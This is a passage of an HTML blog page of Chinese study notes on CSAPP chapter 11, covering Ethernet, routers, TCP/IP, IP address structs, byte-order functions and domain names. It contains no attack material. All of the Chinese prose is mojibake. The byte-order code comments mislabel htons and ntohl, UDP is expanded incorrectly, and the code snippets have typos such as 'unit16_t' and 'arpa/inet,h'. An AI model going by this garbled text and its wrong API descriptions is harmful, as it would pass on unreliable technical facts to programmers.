src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BA%8B%E5%8A%A1%E6%B5%81%E7%A8%8B.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ˜¯è¿›ç¨‹</strong>ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªä¸»æœºæˆ–è€…æœºå™¨ã€‚</p><p>ä¸€å°ä¸»æœºå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨çš„äº‹åŠ¡ä¹Ÿå¯ä»¥åœ¨åŒä¸€å°ä¸»æœºæˆ–è€…ä¸åŒçš„ä¸»æœºä¸Šã€‚</p><h1 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h1><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šå¸¸è¿è¡Œåœ¨ä¸åŒçš„ä¸»æœºä¸Šï¼Œé€šè¿‡è®¡ç®—æœºç½‘ç»œæ¥é€šä¿¡ã€‚</p><p>å¯¹äºä¸»æœºè€Œè¨€ï¼Œç½‘ç»œåªæ˜¯ä¸€ç§ I&#x2F;O è®¾å¤‡ï¼Œæ˜¯æ•°æ®æºå’Œæ•°æ®æ¥æ”¶æ–¹ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84.png"></p><h3 id="å±€åŸŸç½‘"><a href="#å±€åŸŸç½‘" class="headerlink" title="å±€åŸŸç½‘"></a>å±€åŸŸç½‘</h3><p>ç‰©ç†ä¸Šè€Œè¨€ï¼Œç½‘ç»œæ˜¯ä¸€ä¸ªæŒ‰ç…§åœ°ç†è¿œè¿‘ç»„æˆçš„å±‚æ¬¡ç³»ç»Ÿã€‚æœ€ä½å±‚æ˜¯ LANï¼ˆLocal Area Networkï¼Œå±€åŸŸç½‘ï¼‰ï¼Œå¤§æ¦‚æ˜¯åœ¨ä¸€ä¸ªå»ºç­‘æˆ–è€…æ ¡å›­èŒƒå›´å†…ã€‚è¿„ä»Šä¸ºæ­¢ï¼Œæœ€æµè¡Œçš„å±€åŸŸç½‘æŠ€æœ¯æ˜¯<strong>ä»¥å¤ªç½‘ï¼ˆEthernetï¼‰</strong>ï¼Œä»¥å¤ªç½‘çš„é€‚åº”èƒ½åŠ›æå¼º.</p><p>ä¸€ä¸ªä»¥å¤ªç½‘æ®µï¼ˆEthernet segmentï¼‰åŒ…æ‹¬ä¸€äº›ç”µç¼†ï¼ˆé€šå¸¸æ˜¯åŒç»çº¿ï¼‰å’Œä¸€ä¸ªå«åšé›†çº¿å™¨çš„å°ç›’å­ï¼Œä¸»æœºç”¨ç”µç¼†è¿æ¥åˆ°é›†çº¿å™¨ä¸Šã€‚</p><ul><li>æ¯æ ¹ç”µç¼†éƒ½æœ‰ç›¸åŒçš„æœ€å¤§ä½å¸¦å®½ï¼Œé€šå¸¸æ˜¯ 100Mb&#x2F;s æˆ–è€… 1Gb&#x2F;sã€‚ä¸€ç«¯è¿æ¥åˆ°ä¸»æœºçš„é€‚é…å™¨ï¼Œè€Œå¦ä¸€ç«¯åˆ™è¿æ¥åˆ°é›†çº¿å™¨çš„ä¸€ä¸ªç«¯å£ä¸Šã€‚</li><li>é›†çº¿å™¨ä¸åŠ åˆ†è¾¨åœ°å°†ä»ä¸€ä¸ªç«¯å£ä¸Šæ”¶åˆ°çš„æ¯ä¸ªä½å¤åˆ¶åˆ°å…¶ä»–æ‰€æœ‰çš„ç«¯å£ä¸Šï¼Œå› æ­¤åœ¨å¯¹ä¸€ä¸ªé›†çº¿å™¨å‘é€æ•°æ®ä¼šè®©ä¸ä¹‹ç›¸è¿çš„æ‰€æœ‰ä¸»æœºçœ‹åˆ°å‘é€çš„å†…å®¹ã€‚</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%AE%B5.png"></p><p>æ¯ä¸ªä»¥å¤ªç½‘é€‚é…å™¨éƒ½æœ‰ä¸€ä¸ªå…¨çƒå”¯ä¸€çš„ 48 ä½åœ°å€ï¼Œå®ƒå­˜å‚¨åœ¨è¿™ä¸ªé€‚é…å™¨çš„éæ˜“å¤±æ€§å­˜å‚¨å™¨ä¸Šã€‚</p><p>ä¸€å°ä¸»æœºå¯ä»¥å‘é€ä¸€ä¸ªæ ‡è¯†äº†ç›®çš„ MAC åœ°å€çš„å¸§åˆ°ç½‘æ®µå†…çš„ä»»ä½•ä¸»æœºä»¥åŠå…¶å®ƒä¸€äº›å…ƒæ•°æ®ï¼Œæ¯ä¸ªä¸»æœºéƒ½èƒ½çœ‹åˆ°åŒç½‘æ®µå‘é€çš„ä»»ä½•æ¶ˆæ¯ï¼Œä½†æ˜¯ä¸€èˆ¬åªæœ‰ MAC åœ°å€ä¸€è‡´çš„ä¸»æœºä¼šè¯»å–è¿™ä¸ªå¸§ã€‚</p><p>ä½¿ç”¨ç”µç¼†å’Œç½‘æ¡¥å¯ä»¥æŠŠå¤šä¸ªäº’è”ç½‘æ®µè¿æ¥æˆè¾ƒå¤§çš„å±€åŸŸç½‘ï¼Œç§°ä¹‹ä¸ºæ¡¥æ¥ä»¥å¤ªç½‘ï¼ˆbridged Ethernetï¼‰ï¼Œä¸åŒçš„ç”µç¼†çš„å®½å¸¦å¯ä»¥æ˜¯ä¸åŒçš„ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E6%A1%A5%E6%8E%A5%E4%BB%A5%E5%A4%AA%E7%BD%91.png"></p><h3 id="å¹¿åŸŸç½‘"><a href="#å¹¿åŸŸç½‘" class="headerlink" title="å¹¿åŸŸç½‘"></a>å¹¿åŸŸç½‘</h3><p>åœ¨å±‚æ¬¡çš„æ›´é«˜çº§åˆ«ä¸­ï¼Œå¤šä¸ªä¸å…¼å®¹çš„å±€åŸŸç½‘å¯ä»¥é€šè¿‡å«åšè·¯ç”±å™¨çš„ç‰¹æ®Šè®¡ç®—æœºè¿æ¥èµ·æ¥ï¼Œç»„æˆä¸€ä¸ª internetï¼ˆäº’è”ç½‘ç»œï¼‰ã€‚æ¯å°è·¯ç”±å™¨å¯¹äºå®ƒæ‰€è¿æ¥åˆ°çš„æ¯ä¸ªç½‘ç»œéƒ½æœ‰ä¸€ä¸ªé€‚é…å™¨ï¼ˆç«¯å£ï¼‰ã€‚</p><p>è·¯ç”±å™¨ä¹Ÿèƒ½è¿æ¥é«˜é€Ÿç‚¹åˆ°ç‚¹ç”µè¯è¿æ¥ï¼Œç§°ä¸º WANï¼ˆWide-Area Networkï¼Œå¹¿åŸŸç½‘ï¼‰ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%B9%BF%E5%9F%9F%E7%BD%91.png"></p><p>äº’è”ç½‘ç»œè‡³å…³é‡è¦çš„ç‰¹æ€§æ˜¯ï¼Œ<strong>å®ƒèƒ½ç”±é‡‡ç”¨å®Œå…¨ä¸åŒå’Œä¸å…¼å®¹æŠ€æœ¯çš„å„ç§å±€åŸŸç½‘å’Œå¹¿åŸŸç½‘ç»„æˆ</strong>ã€‚</p><p>æ¯å°ä¸»æœºå’Œå…¶ä»–æ¯å°ä¸»æœºéƒ½æ˜¯ç‰©ç†ç›¸è¿çš„ï¼Œä½†æ˜¯å¦‚ä½•èƒ½å¤Ÿè®©æŸå°æºä¸»æœºè·¨è¿‡æ‰€æœ‰è¿™äº›ä¸å…¼å®¹çš„ç½‘ç»œå‘é€æ•°æ®ä½åˆ°å¦ä¸€å°ç›®çš„ä¸»æœºå‘¢ï¼Ÿ</p><p>è§£å†³çš„æ–¹æ³•å°±æ˜¯ä¸€å±‚è¿è¡Œåœ¨æ¯å°ä¸»æœºå’Œè·¯ç”±å™¨ä¸Šçš„<strong>åè®®è½¯ä»¶</strong>ï¼Œå®ƒæ¶ˆé™¤äº†ä¸åŒç½‘ç»œä¹‹é—´çš„å·®å¼‚ã€‚åè®®è½¯ä»¶å®ç°ä¸€ç§åè®®ï¼Œåè®®æ¥æ§åˆ¶ä¸»æœºå’Œè·¯ç”±å™¨ä¹‹é—´å¦‚ä½•ååŒå·¥ä½œæ¥å®ç°æ•°æ®ä¼ è¾“ã€‚åè®®æœ‰ä¸¤ä¸ªåŸºæœ¬èƒ½åŠ›ï¼š</p><ul><li><strong>å‘½åæœºåˆ¶</strong>ï¼šäº’è”ç½‘åè®®é€šè¿‡å®šä¹‰ä¸€ç§ä¸€è‡´çš„ä¸»æœºåœ°å€æ ¼å¼ï¼Œä»è€Œæ¶ˆé™¤äº†ä¸åŒæˆ–è”ç½‘æŠ€æœ¯é€ æˆçš„ä¸»æœºåœ°å€çš„åˆ†é…å·®å¼‚ã€‚æ¯å°ä¸»æœºä¼šè¢«åˆ†é…ä¸€ä¸ªå”¯ä¸€å¾—äº’è”ç½‘åœ°å€ï¼Œè¿™ä¸ªåœ°å€å”¯ä¸€æ ‡è¯†äº†è¿™å°ä¸»æœºã€‚</li><li><strong>ä¼ é€æœºåˆ¶</strong>ï¼šäº’è”ç½‘ç»œåè®®é€šè¿‡å®šä¹‰ä¸€ç§æŠŠæ•°æ®ä½æ†æ‰æˆä¸è¿ç»­çš„ç‰‡ï¼ˆç§°ä¸ºâ€åŒ…â€œï¼‰çš„ç»Ÿä¸€æ–¹å¼ï¼Œåœ¨ç”¨æˆ·ä¹‹é—´ä¼ è¾“ä¿¡æ¯ã€‚ä¸€ä¸ªåŒ…æ˜¯ç”±åŒ…å¤´å’Œæœ‰æ•ˆè½½è·ç»„æˆçš„ï¼Œå…¶ä¸­åŒ…å¤´åŒ…æ‹¬åŒ…çš„å¤§å°ä»¥åŠæºä¸»æœºå’Œæ—¥çš„ä¸»æœºçš„åœ°å€ï¼Œæœ‰æ•ˆè½½è·åŒ…æ‹¬ä»æºä¸»æœºå‘å‡ºçš„æ•°æ®ä½ã€‚</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BA%92%E8%81%94%E7%BD%91%E4%B9%8B%E9%97%B4%E4%BC%A0%E9%80%81%E6%95%B0%E6%8D%AE.png"></p><p>ä¸Šå›¾å±•ç¤ºäº†å¦‚ä½•åœ¨ä¸¤ä¸ªä¸å…¼å®¹çš„å±€åŸŸç½‘ä¹‹é—´ä¼ é€æ•°æ®ï¼Œç»å†äº†ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>è¿è¡Œåœ¨ä¸»æœº A ä¸Šçš„å®¢æˆ·ç«¯è¿›è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä»å®¢æˆ·ç«¯çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¤åˆ¶æ•°æ®åˆ°å†…æ ¸ç¼“å†²åŒºä¸­ã€‚</li><li>ä¸»æœºä¸Šçš„åè®®è½¯ä»¶é€šè¿‡åœ¨æ•°æ®å‰é™„åŠ äº’è”ç½‘ç»œåŒ…å¤´å’Œ LAN1 å¤´ï¼Œåˆ›å»ºäº†ä¸ª LAN1 çš„å¸§ã€‚LAN1 å¤´å¯»å€åˆ°è·¯ç”±å™¨ï¼Œç„¶åå®ƒä¼ é€è¿™ä¸ªå¸§åˆ°é€‚é…å™¨ã€‚</li><li>LAN1 é€‚é…å™¨å¤åˆ¶è¯¥å¸§åˆ°ç½‘ç»œä¸Šï¼Œäº¤ç»™è·¯ç”±å™¨ã€‚</li><li>å½“æ­¤å¸§åˆ°è¾¾è·¯ç”±å™¨æ—¶ï¼Œè·¯ç”±å™¨çš„ LAN1 é€‚é…å™¨ä»ç”µç¼†ä¸Šè¯»å–å®ƒï¼Œå¹¶æŠŠå®ƒä¼ é€åˆ°åè®®è½¯ä»¶ã€‚</li><li>è·¯ç”±å™¨ä»äº’è”ç½‘ç»œåŒ…å¤´ä¸­æå–å‡ºç›®çš„äº’è”ç½‘ç»œåœ°å€ï¼Œå¹¶ç”¨å®ƒä½œä¸ºè·¯ç”±è¡¨çš„ç´¢å¼•ï¼Œç¡®å®šå‘å“ªé‡Œè½¬å‘è¿™ä¸ªåŒ…ã€‚è·¯ç”±å™¨å‰¥è½æ—§çš„ LAN1 çš„å¤´ï¼ŒåŠ ä¸Šå¯»å€åˆ°ä¸»æœº B çš„æ–°çš„ LAN2 å¤´ï¼Œå¹¶æŠŠå¾—åˆ°çš„å¸§ä¼ é€åˆ°é€‚é…å™¨ã€‚</li><li>è·¯ç”±å™¨æŠŠè¯¥å¸§ä¼ é€åˆ° LAN2 ç½‘ç»œä¸Šã€‚</li><li>è¯¥å¸§åˆ°è¾¾ä¸»æœº B æ—¶ï¼Œè¯»å–è¿™ä¸ªå¸§ï¼Œä¼ é€åˆ°åè®®è½¯ä»¶ã€‚</li><li>ä¸»æœº B å‰¥è½åŒ…å¤´å’Œå¸§å¤´ï¼Œè¯»å–å¾—åˆ°æ•°æ®ã€‚æœ€ç»ˆï¼Œåè®®è½¯ä»¶å°†ä¼šå°†å¯¹åº”çš„æ•°æ®æ‹·è´åˆ°å¯¹åº”æœåŠ¡å™¨çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</li></ol><h1 id="å…¨çƒ-IP-å› ç‰¹ç½‘"><a href="#å…¨çƒ-IP-å› ç‰¹ç½‘" class="headerlink" title="å…¨çƒ IP å› ç‰¹ç½‘"></a>å…¨çƒ IP å› ç‰¹ç½‘</h1><p>å…¨çƒ IP å› ç‰¹ç½‘æ˜¯æœ€è‘—åå’Œæœ€æˆåŠŸçš„äº’è”ç½‘ç»œå®ç°ï¼Œå¦‚ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªå› ç‰¹ç½‘å®¢æˆ·ç«¯-æœåŠ¡å™¨åº”ç”¨ç¨‹åºçš„åŸºæœ¬ç¡¬ä»¶å’Œè½¯ä»¶ç»„ç»‡ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%92%8C%E8%BD%AF%E4%BB%B6.png"></p><p>æ¯å°å› ç‰¹ç½‘ä¸»æœºéƒ½è¿è¡Œå®ç° TCP&#x2F;IP åè®®ï¼Œå‡ ä¹æ¯ä¸ªç°ä»£è®¡ç®—æœºç³»ç»Ÿéƒ½æ”¯æŒè¿™ä¸ªåè®®ã€‚å› ç‰¹ç½‘çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ··åˆä½¿ç”¨<strong>å¥—æ¥å­—æ¥å£</strong>å‡½æ•°å’Œ Unix l&#x2F;O å‡½æ•°æ¥è¿›è¡Œé€šä¿¡ã€‚</p><p>TCP&#x2F;IP å®é™…æ˜¯ä¸€ä¸ªåè®®æ—ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªéƒ½æä¾›ä¸åŒçš„åŠŸèƒ½ã€‚</p><ul><li>IP æœºåˆ¶ä»æŸç§æ„ä¹‰ä¸Šè€Œè¨€æ˜¯ä¸å¯é çš„ï¼Œå› ä¸ºï¼Œå¦‚æœæ•°æ®æŠ¥åœ¨ç½‘ç»œä¸­ä¸¢å¤±æˆ–è€…é‡å¤ï¼Œå®ƒå¹¶ä¸ä¼šè¯•å›¾æ¢å¤ã€‚</li><li>UDPï¼ˆUnreliable Datagram Protocolï¼Œä¸å¯é æ•°æ®æŠ¥åè®®ï¼‰ç¨å¾®æ‰©å±•äº† IP åè®®ï¼Œè¿™æ ·ä¸€æ¥ï¼ŒåŒ…å¯ä»¥åœ¨è¿›ç¨‹é—´è€Œä¸æ˜¯åœ¨ä¸»æœºé—´ä¼ é€ã€‚</li><li>TCP æ˜¯ä¸€ä¸ªæ„å»ºåœ¨ IP ä¹‹ä¸Šçš„å¤æ‚åè®®ï¼Œæä¾›äº†è¿›ç¨‹é—´å¯é çš„å…¨åŒå·¥(åŒå‘çš„)è¿æ¥ã€‚</li></ul><p>ä¸ºäº†ç®€åŒ–è®¨è®ºï¼Œæˆ‘ä»¬å°† TCP&#x2F;IP çœ‹åšæ˜¯ä¸€ä¸ªå•ç‹¬çš„æ•´ä½“åè®®ã€‚</p><p>ä»ç¨‹åºå‘˜çš„è§’åº¦ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå› ç‰¹ç½‘çœ‹åšä¸€ä¸ªä¸–ç•ŒèŒƒå›´çš„ä¸»æœºé›†åˆï¼Œæ»¡è¶³ä»¥ä¸‹ç‰¹æ€§ï¼š</p><ul><li>ä¸»æœºé›†åˆè¢«æ˜ å°„ä¸ºä¸€ç»„ 32 ä½çš„ <strong>IP åœ°å€</strong>ã€‚</li><li>è¿™ç»„ IP åœ°å€è¢«æ˜ å°„ä¸ºä¸€ç»„ç§°ä¸º<strong>å› ç‰¹ç½‘åŸŸå</strong>ï¼ˆInternet domain nameï¼‰çš„æ ‡è¯†ç¬¦ã€‚</li><li>å› ç‰¹ç½‘ä¸»æœºä¸Šçš„è¿›ç¨‹èƒ½å¤Ÿé€šè¿‡<strong>è¿æ¥</strong>ï¼ˆconnectionï¼‰å’Œä»»ä½•å…¶ä»–å› ç‰¹ç½‘ä¸»æœºä¸Šçš„è¿›ç¨‹é€šä¿¡ã€‚</li></ul><h3 id="IP-åœ°å€"><a href="#IP-åœ°å€" class="headerlink" title="IP åœ°å€"></a>IP åœ°å€</h3><p>IP åœ°å€å°±æ˜¯ä¸€ä¸ª 32 ä½çš„æ— ç¬¦å·æ•´æ•°ã€‚IP åœ°å€æ•°æ®ç±»å‹ç”±ä¸€ä¸ªç»“æ„ä½“å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* IP address structure */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> s_addr; <span class="hljs-comment">/* Address in network byte order (big-endian) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶å®è¿™ä¸ªåœ°å€å®ƒå¹¶ä¸åº”è¯¥è¢«æ”¾åœ¨ç»“æ„ä½“é‡Œï¼Œä¸º IP åœ°å€å®šä¹‰ä¸ºä¸€ä¸ªæ ‡é‡ç±»å‹åº”è¯¥æ›´æœ‰æ„ä¹‰ï¼Œä½†æ˜¯ç°åœ¨æ›´æ”¹çš„è¯ä¼šæœ‰å¤§é‡çš„ç½‘ç»œåº”ç”¨å—åˆ°æ³¢åŠã€‚</p><p>å› ä¸ºå› ç‰¹ç½‘ä¸»æœºå¯ä»¥æœ‰ä¸åŒçš„ä¸»æœºå­—èŠ‚é¡ºåºï¼ŒTCP&#x2F;IP ä¸ºä»»æ„æ•´æ•°æ•°æ®é¡¹å®šä¹‰äº†ç»Ÿä¸€çš„<strong>ç½‘ç»œå­—èŠ‚é¡ºåº</strong>ï¼ˆnetwork byte orderï¼‰ï¼ˆå¤§ç«¯å­—èŠ‚é¡ºåºï¼‰ã€‚ä¾‹å¦‚ IP åœ°å€æ€»æ˜¯ä»¥å¤§ç«¯åºå­˜æ”¾çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çš„è®¡ç®—æœºå­—èŠ‚é¡ºåºæ˜¯å°ç«¯åºï¼ŒUnix ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›å‡½æ•°è¿›è¡Œè½¬æ¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">htonl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> hostlong)</span>;   <span class="hljs-comment">//å°† 32 ä½æ•´æ•°ç”±ä¸»æœºå­—èŠ‚é¡ºåºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚é¡ºåº</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">htons</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> hostshort)</span>;  <span class="hljs-comment">//å°† 32 ä½æ•´æ•°ä»ç½‘ç»œå­—èŠ‚é¡ºåºè½¬æ¢ä¸ºä¸»æœºå­—èŠ‚</span><br><span class="hljs-comment">// è¿”å›ï¼šæŒ‰ç…§ç½‘ç»œå­—èŠ‚é¡ºåºçš„å€¼ã€‚</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">ntohl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> netlong)</span>;   <span class="hljs-comment">//å°† 16 ä½æ•´æ•°ç”±ä¸»æœºå­—èŠ‚é¡ºåºè½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚é¡ºåº</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">ntohs</span><span class="hljs-params">(<span class="hljs-type">unit16_t</span> netshort)</span>;  <span class="hljs-comment">//å°† 16 ä½æ•´æ•°ä»ç½‘ç»œå­—èŠ‚é¡ºåºè½¬æ¢ä¸ºä¸»æœºå­—èŠ‚</span><br><span class="hljs-comment">// è¿”å›ï¼šæŒ‰ç…§ä¸»æœºå­—èŠ‚é¡ºåºçš„å€¼ã€‚</span><br></code></pre></td></tr></table></figure><p>IP åœ°å€é€šå¸¸æ˜¯ä»¥ä¸€ç§ç§°ä¸º<strong>ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•</strong>æ¥è¡¨ç¤ºçš„ã€‚æ¯ä¸ªå­—èŠ‚ç”±å®ƒçš„åè¿›åˆ¶å€¼è¡¨ç¤ºï¼Œå¹¶ä¸”ç”¨å¥ç‚¹å’Œå…¶ä»–å­—èŠ‚é—´åˆ†å¼€ã€‚ä¾‹å¦‚ï¼Œ<code>128.2.194.242</code> å°±æ˜¯åœ°å€ <code>0x8002c2f2</code> çš„ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºã€‚</p><p>åœ¨ Linux ç³»ç»Ÿä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>HOSTNAME</code> å‘½ä»¤æ¥ç¡®å®šè‡ªå·²ä¸»æœºçš„ç‚¹åˆ†åè¿›åˆ¶åœ°å€ã€‚</p><p>åº”ç”¨ç¨‹åºä½¿ç”¨ <code>inet pton</code> å’Œ <code>inet ntop</code> ä¸½æ•°æ¥å®ç° IP åœ°å€å’Œç‚¹åˆ†åè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet,h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inet_pton</span><span class="hljs-params">(AF_INET, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src, <span class="hljs-type">void</span> *dst)</span>;<br><span class="hljs-comment">//è¿”å›:è‹¥æˆåŠŸåˆ™ä¸º1ï¼Œè‹¥ src ä¸ºéæ³•ç‚¹åˆ†åè¿›åˆ¶åœ°å€åˆ™ä¸º 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸ºä¸€1ã€‚</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntop</span><span class="hljs-params">(AF_INETï¼Œ<span class="hljs-type">const</span> <span class="hljs-type">void</span> *src,<span class="hljs-type">char</span> *dst,socklen t size)</span>;<br><span class="hljs-comment">//è¿”å›:è‹¥æˆåŠŸåˆ™æŒ‡å‘ç‚¹åˆ†åè¿›åˆ¶å­—ç¬¦äº‹çš„æŒ‡é’ˆï¼Œè‹¥å‡ºé”™åˆ™ä¸º NULLã€‚</span><br></code></pre></td></tr></table></figure><p><code>inet_pton</code> å‡½æ•°å°†ä¸€ä¸ªç‚¹åˆ†åè¿›åˆ¶ä¸²ï¼ˆ<em>src</em>ï¼‰è½¬æ¢ä¸ºä¸€ä¸ªäºŒè¿›åˆ¶çš„ç½‘ç»œå­—èŠ‚é¡ºåºçš„IPåœ°å€ï¼ˆ<em>dst</em>ï¼‰ã€‚å¦‚æœ <em>src</em> æ²¡æœ‰æŒ‡å‘ä¸€ä¸ªåˆæ³•çš„ç‚¹åˆ†åè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°å°±è¿”å› 0ã€‚ä»»ä½•å…¶ä»–é”™è¯¯ä¼šè¿”å› -1ï¼Œå¹¶è®¾ç½® errnoã€‚ç›¸ä¼¼åœ°ï¼Œ<code>inet_ntop</code> å‡½æ•°å°†ä¸€ä¸ªäºŒè¿›åˆ¶çš„ç½‘ç»œå­—èŠ‚é¡ºåºçš„ IP åœ°å€(<em>src</em>)è½¬æ¢ä¸ºå®ƒæ‰€å¯¹åº”çš„ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºï¼Œå¹¶æŠŠå¾—åˆ°çš„ä»¥ null ç»“å°¾çš„å­—ç¬¦ä¸²çš„æœ€å¤š size ä¸ªå­—èŠ‚å¤åˆ¶åˆ° <em>dst</em>ã€‚</p><h3 id="å› ç‰¹ç½‘åŸŸå"><a href="#å› ç‰¹ç½‘åŸŸå" class="headerlink" title="å› ç‰¹ç½‘åŸŸå"></a>å› ç‰¹ç½‘åŸŸå</h3><p>å› ç‰¹ç½‘å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº’ç›¸é€šä¿¡æ—¶ä½¿ç”¨çš„æ˜¯ IP åœ°å€ã€‚ç„¶è€Œï¼Œå¯¹äºäººä»¬è€Œè¨€ï¼Œå¤§æ•´æ•°æ˜¯å¾ˆéš¾è®°ä½çš„ï¼Œæ‰€ä»¥å› ç‰¹ç½‘ä¹Ÿå®šä¹‰äº†ä¸€ç»„æ›´åŠ äººæ€§åŒ–çš„<strong>åŸŸå</strong>ï¼ˆdomain nameï¼‰ï¼Œä»¥åŠä¸€ç§å°†åŸŸåæ˜ å°„åˆ° IP åœ°å€çš„æœºåˆ¶ã€‚</p><p>åŸŸåæ˜¯ä¸€ä¸²ç”¨å¥ç‚¹åˆ†éš”çš„å•è¯ï¼ˆå­—æ¯ã€æ•°å­—å’Œ -ï¼‰ï¼Œä¾‹å¦‚ <strong>whaleshark.ics.cs.emu.edu</strong>ã€‚</p><p>åŸŸåé›†åˆå½¢æˆäº†ä¸€ä¸ªå±‚æ¬¡ç»“æ„ï¼Œæ¯ä¸ªåŸŸåç¼–ç äº†å®ƒåœ¨è¿™ä¸ªå±‚æ¬¡ä¸­çš„ä½ç½®ã€‚ä¸‹å›¾å±•ç¤ºäº†åŸŸåå±‚æ¬¡ç»“æ„çš„ä¸€éƒ¨åˆ†ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%9F%9F%E5%90%8D%E7%BB%93%E6%9E%84.png"></p><p>å±‚æ¬¡ç»“æ„å¯ä»¥è¡¨ç¤ºä¸ºä¸€æ£µæ ‘ã€‚æ ‘çš„èŠ‚ç‚¹è¡¨ç¤ºåŸŸåï¼Œ<strong>åå‘åˆ°æ ¹çš„è·¯å¾„å½¢æˆäº†åŸŸå</strong>ã€‚å­æ ‘ç§°ä¸ºå­åŸŸï¼ˆsubdomainï¼‰ã€‚å±‚æ¬¡ç»“æ„ä¸­çš„ç¬¬ä¸€å±‚æ˜¯ä¸€ä¸ªæœªå‘½åçš„æ ¹èŠ‚ç‚¹ã€‚ä¸‹ä¸€å±‚æ˜¯ä¸€ç»„ä¸€çº§åŸŸåï¼ˆfirst-level domainnameï¼‰ï¼Œç”±éè¥åˆ©ç»„ç»‡ICANNï¼ˆInternet Corporation for Assigned Names and Numbersï¼Œå› ç‰¹ç½‘åˆ†é…åå­—æ•°å­—åä¼šï¼‰å®šä¹‰ã€‚</p><p>å¸¸è§çš„ç¬¬ä¸€å±‚åŸŸååŒ…æ‹¬ <code>com</code>ã€<code>edu</code>ã€<code>gov</code>ã€<code>org</code> å’Œ 